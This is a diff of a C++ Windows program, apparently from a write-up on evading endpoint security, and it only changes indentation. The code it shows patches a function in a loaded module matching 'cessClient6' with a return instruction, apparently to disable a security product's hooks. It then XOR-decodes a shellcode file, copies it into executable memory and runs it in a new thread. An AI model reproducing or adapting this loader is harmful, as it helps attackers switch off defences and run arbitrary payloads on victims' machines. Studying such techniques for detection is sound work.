@@ -305,49 +305,49 @@ static std::vector<char> unxor_file(const std::string& filename, char key)
 
 int main(int argc, char* argv[])
 {
-	HMODULE hModules[1024];
-	DWORD cbNeeded = 0;
-	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());
+    HMODULE hModules[1024];
+    DWORD cbNeeded = 0;
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());
 
-	if (EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded))
-	{
-		for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); ++i)
-		{
-			MODULEINFO modInfo = { 0 };
-			if (GetModuleInformation(hProcess, hModules[i], &modInfo, sizeof(MODULEINFO)))
-			{
-				CHAR modName[MAX_PATH] = { 0 };
-				if (GetModuleFileNameExA(hProcess, hModules[i], modName, sizeof(modName) / sizeof(CHAR)))
-				{
-					if (std::string(modName).find("cessClient6") != std::string::npos)
-					{
-						DWORD oldProtect = 0;
-						QWORD addr = (QWORD)modInfo.lpBaseOfDll + 0x2ef60;
+    if (EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded))
+    {
+        for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); ++i)
+        {
+            MODULEINFO modInfo = { 0 };
+            if (GetModuleInformation(hProcess, hModules[i], &modInfo, sizeof(MODULEINFO)))
+            {
+                CHAR modName[MAX_PATH] = { 0 };
+                if (GetModuleFileNameExA(hProcess, hModules[i], modName, sizeof(modName) / sizeof(CHAR)))
+                {
+                    if (std::string(modName).find("cessClient6") != std::string::npos)
+                    {
+                        DWORD oldProtect = 0;
+                        QWORD addr = (QWORD)modInfo.lpBaseOfDll + 0x2ef60;
 
                         if (VirtualProtect((LPVOID)addr, 1, PAGE_READWRITE, &oldProtect))
                         {
                             RtlCopyMemory((LPVOID)addr, "\xc3", 1);
                             VirtualProtect((LPVOID)addr, 1, oldProtect, &oldProtect);
                         }
-					}
-				}
-			}
-		}
-	}
+                    }
+                }
+            }
+        }
+    }
 
-	auto bytes = unxor_file("c:\\users\\user\\desktop\\msgbox.bin", 5);
-	auto size = bytes.size();
+    auto bytes = unxor_file("c:\\users\\user\\desktop\\msgbox.bin", 5);
+    auto size = bytes.size();
 
-	PCHAR buf = (PCHAR)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    PCHAR buf = (PCHAR)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-	std::copy(bytes.begin(), bytes.end(), static_cast<char*>(buf));
-	std::fill(bytes.begin(), bytes.end(), 0);
-	bytes.clear();
+    std::copy(bytes.begin(), bytes.end(), static_cast<char*>(buf));
+    std::fill(bytes.begin(), bytes.end(), 0);
+    bytes.clear();
 
-	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
-	WaitForSingleObject(hThread, INFINITE);
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
+    WaitForSingleObject(hThread, INFINITE);
 
-	return 0;
+    return 0;
 }
 ```
 
